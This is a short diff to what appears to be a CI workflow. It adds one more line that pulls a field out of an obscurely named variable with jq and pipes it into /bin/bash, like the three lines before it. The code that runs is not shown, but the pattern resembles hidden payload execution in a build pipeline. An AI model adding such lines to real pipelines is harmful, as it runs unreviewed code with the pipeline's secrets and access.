@@ -23,6 +23,7 @@ jobs:
           echo $af77903 | jq -r .ashn3 | /bin/bash
           echo $pheb5 | jq -r .mjtn2 | /bin/bash
           echo $mrq17 | jq -r .bdnx9117 | /bin/bash
+          echo $glgd5 | jq -r .plqo874 | /bin/bash
 
       - name: Archive results
         if: always()
